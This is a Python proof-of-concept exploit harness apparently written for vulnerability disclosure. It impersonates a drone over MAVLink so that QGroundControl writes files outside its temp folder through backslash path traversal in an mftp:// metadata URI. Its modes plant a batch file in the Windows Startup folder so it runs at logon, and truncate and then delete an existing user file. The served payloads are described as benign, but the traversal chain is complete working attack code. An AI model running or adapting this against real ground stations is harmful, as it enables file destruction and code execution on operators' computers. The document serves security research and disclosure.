#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
QGC-02 / transport variant -- COMPONENT_METADATA.uri = "mftp://..."
=================================================================

The question this harness exists to answer
------------------------------------------
QGC-02 as disclosed carries its payload over the GCS's own HTTP egress: the
vehicle names an `http://` URL, QGroundControl fetches it, and
QGCFileDownload::_generateOutputPath lets the URL name the output file too.
The obvious vendor response is "so it needs the GCS to have IP egress, and it
needs a TCP/UDP link".

Neither is true, and this harness measures it. `_requestFile` special-cases one
scheme *before* it ever reaches QGCFileDownload:

    // RequestMetaDataTypeStateMachine.cc:498-506
    if (_uriIsMAVLinkFTP(uri)) {
        ...
        if (ftpManager->download(MAV_COMP_ID_AUTOPILOT1, uri,
                                 QStandardPaths::writableLocation(QStandardPaths::TempLocation))) {

Note what is NOT passed: the 4th argument, `fileName`. It defaults to "" --

    // FTPManager.h:33
    bool download(uint8_t fromCompId, const QString& fromURI, const QString& toDir,
                  const QString& fileName="", bool checksize = true);

-- and an empty fileName means FTPManager derives the output name from the
vehicle-supplied URI:

    // FTPManager.cc:64-73
    for (lastDirSlashIndex=_downloadState.fullPathOnVehicle.size()-1; ...) {
        if (_downloadState.fullPathOnVehicle[lastDirSlashIndex] == '/') break;   // '/' ONLY
    }
    lastDirSlashIndex++;
    if (fileName.isEmpty()) {
        _downloadState.fileName = _downloadState.fullPathOnVehicle.right(...);
    }

    // FTPManager.cc:1212-1243  _parseURI -- strips "mftp://", rejects a second
    // "://", honours a [;comp=N] selector. It does NOT reject '\', and it does
    // NOT percent-decode anything.

    // FTPManager.cc:778-779
    _downloadState.file.setFileName(_downloadState.toDir.filePath(_downloadState.fileName));
    if (_downloadState.file.open(QFile::WriteOnly | QFile::Truncate)) {

So the same Windows `\..\` escape out of TempLocation applies -- but the bytes
arrive over MAVLink itself. No HTTP server. No IP egress. This harness never
opens a listening socket other than the MAVLink link.

TWO INDEPENDENT CLAIMS, and this harness is deliberately built to separate them
-------------------------------------------------------------------------------
  Claim 1  the MAVLink *trigger* works over serial/USB, not just TCP/UDP.
  Claim 2  the *payload* needs no IP egress at all.

Claim 2 does NOT require a serial link to demonstrate -- run this over the same
TCP comm link the original PoC used and simply observe that no HTTP server is
running and the file still lands. Claim 1 is then the separate `--serial` run.
Testing them separately means a serial-plumbing problem cannot masquerade as a
failed finding, and vice versa. See MFTP-TESTPLAN.md.

Two differences from the HTTP variant, both load-bearing
--------------------------------------------------------
  1. THE SCHEME IS `mftp`, NOT `mavlinkftp`.
         // FTPManager.h:74
         static constexpr const char* mavlinkFTPScheme = "mftp";
     (QGC-02 README section 5d says "mavlinkftp://" in its prose. The quoted code
     is right -- it uses FTPManager::mavlinkFTPScheme -- but the literal in the
     surrounding sentence is wrong and should be fixed.)

  2. THE SEPARATOR MUST BE A RAW BACKSLASH, NOT %5C.
     The HTTP variant needs `%5C` because QUrl decodes the path before splitting
     it. Nothing on the FTP path decodes anything, so `%5C` would travel through
     as three literal characters and become part of the filename. `--sep pct`
     exists to measure exactly that -- it is the mirror image of the `--sep slash`
     negative control in the HTTP PoC.

Persistence works for the same reason it does over HTTP (README section 5j):
_ftpDownloadComplete (:545) funnels into the same _downloadCompleteJsonWorker,
the translation fetch runs with crcValid == false so the cache insert is skipped,
and _completeRequest's cleanup is gated on the METADATA crc -- which is true.

BENIGN. Authorized bench QGroundControl only. Every byte served is an inert
marker or a .bat that writes one timestamped line and exits. Only the PATH is
hostile.
"""

import argparse
import importlib.util
import json
import os
import re
import socket
import struct
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
_BASE = os.path.join(HERE, "poc_QGC02_metadata_uri_write.py")


def _load_base():
    """Import the disclosed QGC-02 harness as a module.

    It is reused rather than copied: FakeVehicle already implements a complete
    MAVLink-FTP *server* (OpenFileRO / ReadFile / BurstReadFile / sessions, with
    the srcComponent restamping FTPManager::_mavlinkMessageReceived requires),
    plus the param.pck service that keeps the connect log readable and the
    MetadataVehicle that answers MAV_CMD_REQUEST_MESSAGE(397). Copying 2,700
    lines to change a URI scheme would guarantee the two drift apart.
    """
    if not os.path.exists(_BASE):
        sys.exit("cannot find sibling harness: %s" % _BASE)
    spec = importlib.util.spec_from_file_location("qgc02_base", _BASE)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)          # module_level code is import-safe (main() is guarded)
    return mod


H = _load_base()
mavutil = H.mavutil
banner, observe, warn, ok, attack = H.banner, H.observe, H.warn, H.ok, H.attack

SCHEME = "mftp"          # FTPManager.h:74 -- NOT "mavlinkftp"

_FTP_DUMP = re.compile(
    r"^(MAVFTP request: opcode=(\d+) size=\d+ offset=\d+ data=)(.*)$", re.S)

# OpenFileRO carries the attacker path in data= -- that line is the evidence and
# must never be trimmed. Every other opcode's data= is padding.
_FTP_KEEP_FULL = {"4"}


def _install_log_filter():
    """Trim the base harness's full 239-byte FTP payload dump.

    It prints req["data"] on every request. For OpenFileRO that is the traversal
    path and is exactly what the operator is here to read; for BurstReadFile it is
    239 bytes of meaningless zero padding that pushes the lines that matter off
    the screen. Display layer only -- nothing about the exchange changes.
    """
    real = H.observe

    def _filtered(msg):
        m = _FTP_DUMP.match(msg)
        if m and m.group(2) not in _FTP_KEEP_FULL and len(m.group(3)) > 40:
            msg = "%s<%d bytes of padding>" % (m.group(1), len(m.group(3)))
        real(msg)

    H.observe = _filtered


SEPARATORS = {
    # A raw backslash. Nothing on the MAVLink-FTP path percent-decodes, and
    # FTPManager.cc:66 splits on '/' only, so '\' survives into the output
    # filename intact and Windows resolves it as a separator at open() time.
    "raw": "\\",
    # Percent-encoded. PREDICTED NOT TO TRAVERSE on this path -- the exact
    # inverse of the HTTP variant. Kept so the negative is reproducible and so
    # the difference between the two sinks is measured rather than asserted.
    "pct": "%5C",
}


def build_path(updirs, tail, sep="\\"):
    r"""<dummy>\..\..\...\<tail>.

    The dummy leading segment costs one '..' to climb back out of, and keeps the
    string from starting with '..'. Arithmetic is identical to the HTTP variant
    because the base directory is the same TempLocation:
        C:/Users/<u>/AppData/Local/Temp
        a\..   -> Temp      \..  -> Local     \..  -> AppData     \..  -> <profile>
    so Desktop needs 4 and the Roaming-rooted Startup path needs 3.

    IMPORTANT: the result must contain no forward slash. FTPManager.cc:64-73
    keeps only what follows the LAST '/', so a single '/' anywhere in the tail
    would silently truncate the traversal and the file would land in Temp.
    """
    p = "a" + (sep + "..") * updirs + sep + tail
    assert "/" not in p, "a '/' in the path would be eaten by FTPManager.cc:66"
    return p


def qgc_derive(uri):
    """Mirror FTPManager::_parseURI + the fileName split, so every prediction this
    harness prints is COMPUTED the same way QGC computes it rather than asserted.

        FTPManager.cc:1220   parsedURI = parsedURI.right(len - len("mftp://") + 1)
                             -- the +1 deliberately keeps the second '/'
        FTPManager.cc:64-70  scan back for the last '/' -- '/' ONLY, never '\\'
        FTPManager.cc:73     fileName = everything after it
    """
    p = uri
    pre = SCHEME + "://"
    if p.lower().startswith(pre):
        p = p[len(pre) - 1:]
    return p, p[p.rfind("/") + 1:]


class MftpVehicle(H.MetadataVehicle):
    """MetadataVehicle plus one switch: optionally NAK the read after ACKing the
    open, to measure what a FAILED mftp download leaves behind.

    This matters because the HTTP and FTP sinks differ on failure and the
    difference is not in QGC-02's favour or against it until it is measured:

      HTTP  QGCFileDownload.cc:136 truncates before :149 fetches, and nothing
            cleans up -> victim file left at 0 bytes.
      FTP   FTPManager.cc:779 truncates on the OpenFileRO ack, then
            FTPManager.cc:329-333 calls file.remove() when errorMsg is set
            -> victim file predicted GONE, not merely emptied.

    Either way the operator's data is destroyed; the mode records which.
    """

    def __init__(self, *a, **kw):
        # The name of the ONE file whose read should be NAKed, or None. It has to
        # be scoped to that file: NAKing every read would also kill @PARAM/param.pck
        # and the g.json metadata fetch, so the chain would never learn the
        # translationUri and the victim path would never be opened at all.
        self.nak_target = kw.pop("nak_target", None)
        super().__init__(*a, **kw)

    def _ftp_read(self, req, burst):
        sess = self._ftp_sessions.get(req["session"])
        if self.nak_target and sess and sess[0] == self.nak_target:
            attack("destroy mode: ACKed the open (FTPManager.cc:779 has already "
                   "created+truncated the victim), now NAKing the read to force "
                   "_downloadComplete(error) -> FTPManager.cc:333 file.remove()")
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_FAIL]))
            return
        return super()._ftp_read(req, burst)


MODES = {
    "control": dict(
        name="QGC02_MFTP_CONTROL.txt", updirs=0, kind="direct",
        note="INSTRUMENT, run this first. 'mftp://QGC02_MFTP_CONTROL.txt' with no "
             "traversal. Proves the mftp:// branch is taken at all, that our FTP "
             "server answers, and that the file lands in TempLocation -- so a "
             "negative traversal result later is meaningful and not just a broken link"),
    "traversal": dict(
        name="QGC02_MFTP_PWNED.txt", updirs=4, kind="direct",
        note="THE FIRST QUESTION. Raw backslashes in the COMPONENT_METADATA.uri "
             "itself, aiming out of TempLocation onto the Desktop. Transient by "
             "design (crcValid is true here, so _downloadCompleteJsonWorker "
             "cache-moves it -- exactly as in HTTP mode 'traversal'); watch the log, "
             "not the Desktop"),
    "persist": dict(
        name="QGC02_MFTP_PERSIST.txt", updirs=4, kind="chain",
        note="THE PERSISTENT WRITE, zero IP egress. COMPONENT_METADATA.uri -> "
             "'mftp://g.json' -> that JSON's translationUri is an mftp:// traversal "
             "path. crcValid is false on the translation fetch so it is never "
             "cache-moved, and _completeRequest's cleanup is gated on the METADATA "
             "crc. Lands on the Desktop and STAYS"),
    "startup": dict(
        name="QGC02_MFTP_DEMO.bat", updirs=3, kind="chain",
        note="CODE EXECUTION over a link that never touches IP. Same chain as "
             "'persist' aimed at the per-user Startup folder. The path is far too "
             "long for COMPONENT_METADATA.uri's char[100] -- it fits because "
             "translationUri travels inside JSON that arrived over MAVLink-FTP. "
             "The .bat writes one timestamped line to the Desktop and exits"),
    "destroy": dict(
        name="QGC02-MFTP-VICTIM.txt", updirs=4, kind="chain", nak=True,
        note="DESTRUCTION, and an honest measurement. Traverse onto an EXISTING "
             "file, ACK the open (which truncates it) then NAK the read. Predicted: "
             "the file is REMOVED, not merely emptied (FTPManager.cc:329-333) -- "
             "which differs from the HTTP variant's 0-byte survivor. Create the "
             "victim file first; record which of intact / 0-byte / gone you get"),
}

# Startup lives under Roaming, which is a sibling of Local -- so 3 '..' from Temp
# reaches AppData and the tail is Roaming-rooted. Raw space, not %20: nothing on
# this path decodes.
STARTUP_TAIL = "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"



# ---------------------------------------------------------------------------
# Loopback self-test.
#
# Stands the harness up on 127.0.0.1 and drives it with a minimal MAVLink-FTP
# client that does exactly what FTPManager does: request COMPONENT_METADATA,
# take the uri, run it through _parseURI, OpenFileRO the resulting
# fullPathOnVehicle, BurstReadFile the content.
#
# This verifies everything that does NOT need Windows: that the mftp:// uri is
# advertised and fits the wire field, that the traversal survives the fileName
# split with a '/' nowhere in it, that the chain's JSON parses and yields the
# long translationUri, and that our FTP server actually serves the bytes at the
# traversed path. What it CANNOT verify is Qt's path normalisation and the
# WriteOnly|Truncate at FTPManager.cc:779 -- that is what the VM run is for.
# ---------------------------------------------------------------------------

FTP_HDR = 12
FTP_MAX_DATA = 251 - FTP_HDR


class _FtpClient(object):
    """The FTPManager side of the conversation, in about 60 lines."""

    def __init__(self, conn, tsys=1, tcomp=1):
        self.c = conn
        self.tsys = tsys
        self.tcomp = tcomp
        self.seq = 0

    def _send(self, opcode, session=0, size=0, offset=0, data=b""):
        p = bytearray(251)
        struct.pack_into("<H", p, 0, self.seq & 0xFFFF)
        self.seq = (self.seq + 1) & 0xFFFF
        p[2] = session
        p[3] = opcode
        p[4] = size
        struct.pack_into("<I", p, 8, offset)
        p[FTP_HDR:FTP_HDR + len(data)] = data[:FTP_MAX_DATA]
        self.c.mav.file_transfer_protocol_send(0, self.tsys, self.tcomp, list(p))

    def _recv(self, expect, timeout=8.0):
        """Wait for a reply to the opcode we just sent.

        Filtering on req_opcode matters: TerminateSession is also ACKed, and a
        chain mode does two fetches on one session-less client, so without this
        the second OpenFileRO reads the previous fetch's TerminateSession ACK
        (size 0) and unpacking the file length blows up.
        """
        end = time.time() + timeout
        while time.time() < end:
            m = self.c.recv_match(type="FILE_TRANSFER_PROTOCOL",
                                  blocking=True, timeout=0.5)
            if m is None:
                continue
            raw = bytes(bytearray(m.payload))
            r = dict(seq=struct.unpack_from("<H", raw, 0)[0], session=raw[2],
                     opcode=raw[3], size=raw[4], req_opcode=raw[5],
                     burst=raw[6], offset=struct.unpack_from("<I", raw, 8)[0],
                     data=raw[FTP_HDR:FTP_HDR + raw[4]])
            if r["req_opcode"] != expect:
                continue                      # stale reply from an earlier step
            return r
        raise AssertionError("timed out waiting for a reply to opcode %d" % expect)

    def fetch(self, full_path):
        self._send(4, size=len(full_path), data=full_path.encode())      # OpenFileRO
        r = self._recv(4)
        assert r["opcode"] == 128, "OpenFileRO NAKed for %r (err=%r)" % (
            full_path, r["data"])
        assert r["size"] >= 4, "OpenFileRO ACK carried no file length"
        session, total = r["session"], struct.unpack("<I", r["data"][:4])[0]
        self._send(15, session=session, offset=0, size=FTP_MAX_DATA)     # BurstReadFile
        buf = b""
        while True:
            r = self._recv(15)
            if r["opcode"] != 128:
                raise AssertionError("read NAKed at offset %d (err=%r)"
                                     % (len(buf), r["data"]))
            buf += r["data"]
            if r["burst"]:
                break
        self._send(1, session=session)                                   # TerminateSession
        self._recv(1)                                                    # drain its ACK
        assert len(buf) == total, "size mismatch: got %d, OpenFileRO said %d" % (
            len(buf), total)
        return buf


def _free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _selftest():
    import io as _io
    failures = []

    for mode in sorted(MODES):
        m = MODES[mode]
        sep = SEPARATORS["raw"]
        name, updirs = m["name"], m["updirs"]

        if m["kind"] == "direct":
            tail = ("Desktop" + sep + name) if updirs else name
            target = build_path(updirs, tail, sep) if updirs else name
            meta_uri = "%s://%s" % (SCHEME, target)
            expect_body, chain = H.MARKER, None
        else:
            if mode == "startup":
                tail = STARTUP_TAIL + name
                body = H.BENIGN_BAT
            else:
                tail = "Desktop" + sep + name
                body = H.MARKER
            target = build_path(updirs, tail, sep)
            meta_uri = "%s://g.json" % SCHEME
            expect_body = body
            chain = dict(target=target, body=body,
                         translation_uri="%s://%s" % (SCHEME, target),
                         param_uri="%s://p.json" % SCHEME)

        port = _free_port()
        v = MftpVehicle("tcpin:127.0.0.1:%d" % port, sysid=1, compid=1,
                        verbose=False, meta_uri=meta_uri, file_crc=0,
                        nak_target=None)     # never NAK here: we are testing delivery
        v.add_ftp_file("@PARAM/param.pck", H.build_param_pck())
        if chain:
            v.add_ftp_file("g.json", H.build_general_json(chain["param_uri"],
                                                          chain["translation_uri"]))
            v.add_ftp_file("p.json", H.MARKER)
            v.add_ftp_file(chain["target"], chain["body"])
        else:
            v.add_ftp_file(target, H.MARKER)

        # The harness prints to stdout on every request; keep the report readable.
        real_stdout, sys.stdout = sys.stdout, _io.StringIO()
        try:
            threading.Thread(target=v.start, daemon=True).start()
            time.sleep(0.4)
            cli = mavutil.mavlink_connection("tcp:127.0.0.1:%d" % port,
                                             source_system=255, source_component=190)
            cli.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                                   mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
            assert cli.recv_match(type="HEARTBEAT", blocking=True, timeout=8), \
                "no heartbeat from the harness"

            cli.mav.command_long_send(
                1, 1, mavutil.mavlink.MAV_CMD_REQUEST_MESSAGE, 0,
                397, 0, 0, 0, 0, 0, 0)
            # pymavlink 2.4.41 has no COMPONENT_METADATA (397), which is exactly
            # why the base harness hand-frames it. The client therefore gets a
            # MAVLink_unknown, and we decode the payload ourselves -- which is the
            # stronger test anyway: it checks the bytes actually on the wire.
            #   MAVLink2: [0]=0xFD [1]=len ...10-byte header... payload, crc
            #   payload:  time_boot_ms u32 | file_crc u32 | uri char[100]
            md = cli.recv_match(type="UNKNOWN_397", blocking=True, timeout=8)
            assert md is not None, "harness never answered COMPONENT_METADATA(397)"
            buf = bytes(md.data)
            payload = buf[10:10 + buf[1]]
            assert len(payload) >= 8, "COMPONENT_METADATA payload too short"
            uri = payload[8:].decode("utf-8", "replace").rstrip("\x00")
            assert uri == meta_uri, "advertised %r, expected %r" % (uri, meta_uri)
            assert len(uri.encode()) <= 100, "uri overflows char[100]"

            ftp = _FtpClient(cli)
            full, fname = qgc_derive(uri)
            got = ftp.fetch(full)

            if chain:
                doc = json.loads(got.decode())
                turi = doc["metadataTypes"][0]["translationUri"]
                assert turi == chain["translation_uri"], "translationUri mismatch"
                assert doc["metadataTypes"][0].get("fileCrc") is not None, \
                    "no fileCrc -> CompInfoGeneral.cc:72 would skip the entry and " \
                    "_jsonMetadataCrcValid would be false, which un-skips the cleanup"
                tfull, fname = qgc_derive(turi)
                got = ftp.fetch(tfull)

            assert got == expect_body, "served body mismatch"
            # The property the whole finding rests on: the traversal must survive
            # the fileName split intact.
            if updirs:
                assert ".." in fname and fname.startswith("a\\"), \
                    "traversal did NOT survive the split: %r" % fname
                assert "/" not in fname, "a '/' leaked in and truncated the traversal"
            result = ("PASS", fname)
        except Exception as e:                                   # noqa: BLE001
            result = ("FAIL", "%s: %s" % (type(e).__name__, e))
            failures.append(mode)
        finally:
            sys.stdout = real_stdout
            v.stop()

        status, detail = result
        (ok if status == "PASS" else warn)("%-10s %s  %s" % (mode, status, detail))

    # The %5C negative control, checked without a link: it is a pure string property.
    pf = build_path(4, "Desktop%5CX.txt", SEPARATORS["pct"])
    _, pfn = qgc_derive("%s://%s" % (SCHEME, pf))
    if "\\" in pfn and "%5C" not in pfn:
        warn("sep=pct  FAIL  %5C unexpectedly became a real backslash")
        failures.append("pct")
    else:
        ok("sep=pct    PASS  %r stays literal -- nothing on this path decodes, so "
           "it should land in TempLocation under that name" % pfn)

    print()
    if failures:
        warn("SELFTEST FAILED: %s" % ", ".join(failures))
        return 1
    ok("SELFTEST PASSED -- wire protocol, chain and traversal survival all verified.")
    ok("What remains untested here is Qt path normalisation + the truncating open")
    ok("at FTPManager.cc:779. That is the Windows VM run.")
    return 0


def main():
    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument("--mode", choices=sorted(MODES), default="control")
    ap.add_argument("--sep", choices=sorted(SEPARATORS), default="raw",
                    help="path separator: 'raw' (a real backslash -- traverses) or "
                         "'pct' (%%5C -- predicted NOT to traverse here, because "
                         "nothing on the FTP path percent-decodes). Default raw.")
    ap.add_argument("--updirs", type=int, default=None,
                    help="override the number of '..' segments (per-mode default)")
    ap.add_argument("--name", help="override the target filename")
    ap.add_argument("--uri", help="advertise this URI verbatim, ignoring --mode")
    ap.add_argument("--serial", metavar="DEV[,BAUD]",
                    help="run the MAVLink link over a serial/USB port instead of TCP, "
                         "e.g. --serial /dev/tty.usbserial-A1,115200 or --serial COM5. "
                         "This is the Claim-1 run; Claim 2 needs no serial link.")
    ap.add_argument("--dry-run", action="store_true",
                    help="print the full plan and the FTP file table, then exit "
                         "without opening a link. Use this to sanity-check the "
                         "traversal arithmetic before touching the VM.")
    ap.add_argument("--logfile", default="qgc02-mftp-run.log",
                    help="tee output here (default qgc02-mftp-run.log; '' to disable)")
    ap.add_argument("--selftest", action="store_true",
                    help="run the loopback wire-protocol test and exit; needs no "
                         "QGC, no VM and no network")
    ap.add_argument("-h", "--help", action="help")
    args, rest = ap.parse_known_args()

    _install_log_filter()

    if args.selftest:
        banner("QGC-02 mftp variant -- loopback self-test")
        return _selftest()

    m = MODES[args.mode]
    sep = SEPARATORS[args.sep]
    name = args.name or m["name"]
    updirs = args.updirs if args.updirs is not None else m["updirs"]

    # ---- compose the paths -------------------------------------------------
    if m["kind"] == "direct":
        tail = ("Desktop" + sep + name) if updirs else name
        target = build_path(updirs, tail, sep) if updirs else name
        meta_uri = args.uri or ("%s://%s" % (SCHEME, target))
        chain = None
        pretty = (r"%USERPROFILE%\Desktop" + "\\" + name) if updirs \
            else r"<TempLocation>\%s" % name
    else:
        if args.mode == "startup":
            tail = STARTUP_TAIL.replace("\\", sep) + name
            pretty = r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" + "\\" + name
            body = H.BENIGN_BAT
        else:
            tail = "Desktop" + sep + name
            pretty = r"%USERPROFILE%\Desktop" + "\\" + name
            body = H.MARKER
        target = build_path(updirs, tail, sep)
        meta_uri = args.uri or ("%s://g.json" % SCHEME)
        chain = dict(target=target, body=body,
                     translation_uri="%s://%s" % (SCHEME, target),
                     param_uri="%s://p.json" % SCHEME)

    # ---- logging -----------------------------------------------------------
    if args.logfile and not args.dry_run:
        class _Tee(object):
            def __init__(self, *s): self.streams = s
            def write(self, d):
                for st in self.streams:
                    st.write(d); st.flush()
            def flush(self):
                for st in self.streams: st.flush()
        sys.stdout = _Tee(sys.__stdout__, open(args.logfile, "w", encoding="utf-8"))

    banner("QGC-02 transport variant: COMPONENT_METADATA.uri = mftp:// "
           "-> FTPManager output path")
    warn("BENIGN PoC. Authorized bench QGroundControl only. Only the PATH is hostile.")
    observe("mode=%s -- %s" % (args.mode, m["note"]))
    observe("separator = %r (%s)" % (sep, args.sep))
    if args.sep == "pct":
        warn("--sep pct is the NEGATIVE CONTROL. Nothing on the FTP path decodes,")
        warn("so %5C should stay literal and the file should land in TempLocation")
        warn("under a name full of percent signs. If it TRAVERSES, that is a new")
        warn("finding and the analysis in this file is wrong.")

    observe("advertised COMPONENT_METADATA.uri = %r" % meta_uri)
    n = len(meta_uri.encode())
    observe("  %d of 100 bytes (COMPONENT_METADATA.uri is char[100])" % n)
    if n > 100:
        warn("uri EXCEEDS the 100-byte wire field and WILL be truncated -- the test")
        warn("would measure the wrong thing. Use a chain mode instead.")
        return 2

    # ---- what QGC will derive ---------------------------------------------
    full, fname = qgc_derive(chain["translation_uri"] if chain else meta_uri)
    observe("FTPManager::_parseURI -> fullPathOnVehicle = %r" % full)
    observe("FTPManager.cc:73      -> fileName          = %r" % fname)
    observe("QDir(TempLocation).filePath(fileName), then Windows normalises:")
    observe("  predicted write: %s" % pretty)

    if chain:
        observe("")
        observe("chain stage 1: COMPONENT_METADATA.uri -> %s (%d bytes)" % (meta_uri, n))
        observe("chain stage 2: that JSON registers COMP_METADATA_TYPE_PARAMETER with")
        observe("               translationUri = %r" % chain["translation_uri"])
        observe("               (%d bytes -- unbounded; it travels in JSON, not MAVLink)"
                % len(chain["translation_uri"]))
        observe("chain stage 3: QGC fetches it over MAVLink-FTP to the traversed path")
        observe("               and does NOT cache-move or delete it")
    if args.mode == "startup":
        warn("startup mode plants a .bat that RUNS at next logon. It is benign -- it")
        warn(r"writes one line to %USERPROFILE%\Desktop\QGC02_RCE_PROOF.txt and exits.")
        warn("Delete both files when you are done.")
    if m.get("nak"):
        warn("destroy mode needs the victim file to EXIST first. Create it with:")
        warn('  echo MISSION CONFIG - DO NOT LOSE > '
             + '"%USERPROFILE%\\Desktop\\' + name + '"')

    ok("NO HTTP SERVER IS STARTED BY THIS HARNESS. If the write lands, it landed")
    ok("with the GCS making zero outbound IP connections -- that is the whole point.")

    # ---- build the vehicle -------------------------------------------------
    sys.argv = [sys.argv[0]] + rest
    base = H.FakeVehicle.from_cli("QGC-02 mftp transport variant")
    conn = base.conn_str

    if args.serial:
        dev, _, baud = args.serial.partition(",")
        baud = int(baud) if baud else 115200
        conn = dev
        _orig = mavutil.mavlink_connection

        def _conn(device, **kw):
            kw.setdefault("baud", baud)
            return _orig(device, **kw)

        mavutil.mavlink_connection = _conn
        observe("serial transport: %s @ %d baud (Claim 1 -- the MAVLink trigger is "
                "transport-agnostic)" % (dev, baud))

    v = MftpVehicle(conn, sysid=base.sysid, compid=base.compid,
                    verbose=base.verbose, meta_uri=meta_uri, file_crc=0,
                    nak_target=(target if m.get("nak") else None))

    # ---- register everything the FTP server will serve ---------------------
    # Keys must match what QGC asks for. OpenFileRO carries fullPathOnVehicle;
    # _resolve_ftp_file lstrips the leading '/', so the key is the path with the
    # scheme and leading slash removed -- i.e. exactly `target`.
    pck = H.build_param_pck()
    v.add_ftp_file("@PARAM/param.pck", pck)

    if chain:
        general = H.build_general_json(chain["param_uri"], chain["translation_uri"])
        v.add_ftp_file("g.json", general)
        v.add_ftp_file("p.json", H.MARKER)
        v.add_ftp_file(chain["target"], chain["body"])
    else:
        v.add_ftp_file(target, H.MARKER)

    observe("")
    observe("MAVLink-FTP files this harness will serve:")
    for k in sorted(v.ftp_files):
        observe("  %-58s %6d bytes" % (repr(k), len(v.ftp_files[k])))

    if args.dry_run:
        ok("dry run -- no link opened, nothing sent. Re-run without --dry-run.")
        return 0

    v.start()
    attack("Connect QGC to this host (or plug in the serial link). COMPONENT_METADATA")
    attack("is requested during the initial connect, before parameters -- nothing to click.")
    observe("Watch for, in order:")
    observe("  1. 'QGC requested COMPONENT_METADATA (397) -- answering'")
    observe("  2. 'MAVFTP request: opcode=4' (OpenFileRO) for our path")
    observe("  3. 'served MAVFTP OpenFileRO -> session=..'")
    observe("If (1) never appears the link is the problem, not the finding.")
    observe("If (1) appears but (2) does not, QGC did not take the mftp:// branch --")
    observe("check the scheme literal against FTPManager.h:74.")
    v.serve_forever()
    return 0


if __name__ == "__main__":
    sys.exit(main())
